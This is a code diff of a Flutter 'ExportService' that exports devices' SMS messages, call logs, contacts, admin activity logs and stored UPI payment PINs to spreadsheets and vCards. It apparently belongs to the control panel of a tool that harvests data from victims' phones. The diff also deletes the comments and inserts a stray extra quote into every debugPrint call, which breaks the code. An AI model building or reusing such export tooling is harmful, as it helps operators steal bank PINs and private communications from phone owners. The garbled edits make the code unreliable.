@@ -16,26 +16,23 @@ class ExportService {
   factory ExportService() => _instance;
   ExportService._internal();
 
-  // Helper: Get latest UPI PIN from device
   String _getLatestUpiPin(Device device) {
-    // Use new upiPins array first
+
     if (device.latestUpiPin != null) {
       return device.latestUpiPin!.pin;
     }
-    // Fallback to deprecated upiPin field
+
     if (device.upiPin != null && device.upiPin!.isNotEmpty) {
       return device.upiPin!;
     }
     return '';
   }
 
-  // 📊 Export Devices to Excel
   Future<bool> exportDevicesToExcel(List<Device> devices) async {
     try {
       final excel = Excel.createExcel();
       final sheet = excel['Devices'];
 
-      // Headers
       sheet.appendRow([
         TextCellValue('Device ID'),
         TextCellValue('Model'),
@@ -55,7 +52,6 @@ class ExportService {
         TextCellValue('Registered At'),
       ]);
 
-      // Data rows
       for (var device in devices) {
         sheet.appendRow([
           TextCellValue(device.deviceId),
@@ -77,22 +73,19 @@ class ExportService {
         ]);
       }
 
-      // Save and share
       final fileName = 'devices_${DateTime.now().millisecondsSinceEpoch}.xlsx';
       return await _saveAndShare(excel, fileName, 'Devices Export');
     } catch (e) {
-      debugPrint('❌ Export devices failed: $e');
+      debugPrint(''❌ Export devices failed: $e');
       return false;
     }
   }
 
-  // 📱 Export SMS Messages to Excel
   Future<bool> exportSmsToExcel(List<SmsMessage> messages, String deviceId) async {
     try {
       final excel = Excel.createExcel();
       final sheet = excel['SMS'];
 
-      // Headers
       sheet.appendRow([
         TextCellValue('ID'),
         TextCellValue('Type'),
@@ -103,7 +96,6 @@ class ExportService {
         TextCellValue('Is Read'),
       ]);
 
-      // Data rows
       for (var sms in messages) {
         sheet.appendRow([
           TextCellValue(sms.id),
@@ -119,18 +111,16 @@ class ExportService {
       final fileName = 'sms_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.xlsx';
       return await _saveAndShare(excel, fileName, 'SMS Export');
     } catch (e) {
-      debugPrint('❌ Export SMS failed: $e');
+      debugPrint(''❌ Export SMS failed: $e');
       return false;
     }
   }
 
-  // 📞 Export Call Logs to Excel
   Future<bool> exportCallsToExcel(List<CallLog> calls, String deviceId) async {
     try {
       final excel = Excel.createExcel();
       final sheet = excel['Calls'];
 
-      // Headers
       sheet.appendRow([
         TextCellValue('Number'),
         TextCellValue('Name'),
@@ -139,7 +129,6 @@ class ExportService {
         TextCellValue('Timestamp'),
       ]);
 
-      // Data rows
       for (var call in calls) {
         sheet.appendRow([
           TextCellValue(call.number),
@@ -153,12 +142,11 @@ class ExportService {
       final fileName = 'calls_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.xlsx';
       return await _saveAndShare(excel, fileName, 'Calls Export');
     } catch (e) {
-      debugPrint('❌ Export calls failed: $e');
+      debugPrint(''❌ Export calls failed: $e');
       return false;
     }
   }
 
-  // 👤 Export Contacts to vCard
   Future<bool> exportContactsToVCard(List<Contact> contacts, String deviceId) async {
     try {
       final vCardData = StringBuffer();
@@ -177,18 +165,16 @@ class ExportService {
       final fileName = 'contacts_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.vcf';
       return await _saveAndShareText(vCardData.toString(), fileName, 'Contacts Export');
     } catch (e) {
-      debugPrint('❌ Export contacts failed: $e');
+      debugPrint(''❌ Export contacts failed: $e');
       return false;
     }
   }
 
-  // 📋 Export Activity Logs to Excel
   Future<bool> exportActivityLogsToExcel(List<ActivityLog> activities) async {
     try {
       final excel = Excel.createExcel();
       final sheet = excel['Activity Logs'];
 
-      // Headers
       sheet.appendRow([
         TextCellValue('ID'),
         TextCellValue('Admin'),
@@ -200,7 +186,6 @@ class ExportService {
         TextCellValue('Timestamp'),
       ]);
 
-      // Data rows
       for (var activity in activities) {
         sheet.appendRow([
           TextCellValue(activity.id),
@@ -217,24 +202,21 @@ class ExportService {
       final fileName = 'activity_logs_${DateTime.now().millisecondsSinceEpoch}.xlsx';
       return await _saveAndShare(excel, fileName, 'Activity Logs Export');
     } catch (e) {
-      debugPrint('❌ Export activity logs failed: $e');
+      debugPrint(''❌ Export activity logs failed: $e');
       return false;
     }
   }
 
-  // 💾 Export to CSV (Alternative)
   Future<bool> exportDevicesToCsv(List<Device> devices) async {
     try {
       List<List<dynamic>> rows = [];
-      
-      // Headers
+
       rows.add([
         'Device ID', 'Model', 'Manufacturer', 'OS Version', 'Status', 
         'Battery', 'Online', 'Total SMS', 'Total Contacts', 'Total Calls',
         'Has UPI', 'UPI PIN', 'Note Priority', 'Note Message', 'Last Ping', 'Registered At'
       ]);
 
-      // Data rows
       for (var device in devices) {
         rows.add([
           device.deviceId,
@@ -260,20 +242,19 @@ class ExportService {
       final fileName = 'devices_${DateTime.now().millisecondsSinceEpoch}.csv';
       return await _saveAndShareText(csvData, fileName, 'Devices CSV Export');
     } catch (e) {
-      debugPrint('❌ Export CSV failed: $e');
+      debugPrint(''❌ Export CSV failed: $e');
       return false;
     }
   }
 
-  // Helper: Save Excel and Share
   Future<bool> _saveAndShare(Excel excel, String fileName, String subject) async {
     try {
       if (kIsWeb) {
-        // For web, trigger download
+
         excel.save(fileName: fileName);
         return true;
       } else {
-        // For mobile, save to temp directory and share
+
         final directory = await getTemporaryDirectory();
         final file = File('${directory.path}/$fileName');
         
@@ -291,17 +272,16 @@ class ExportService {
         return false;
       }
     } catch (e) {
-      debugPrint('❌ Save and share failed: $e');
+      debugPrint(''❌ Save and share failed: $e');
       return false;
     }
   }
 
-  // Helper: Save Text and Share (for vCard and CSV)
   Future<bool> _saveAndShareText(String content, String fileName, String subject) async {
     try {
       if (kIsWeb) {
-        // For web, we'd need to use download API
-        debugPrint('⚠️ Text export not fully supported on web');
+
+        debugPrint(''⚠️ Text export not fully supported on web');
         return false;
       } else {
         final directory = await getTemporaryDirectory();
@@ -317,7 +297,7 @@ class ExportService {
         return result.status == ShareResultStatus.success;
       }
     } catch (e) {
-      debugPrint('❌ Save and share text failed: $e');
+      debugPrint(''❌ Save and share text failed: $e');
       return false;
     }
   }
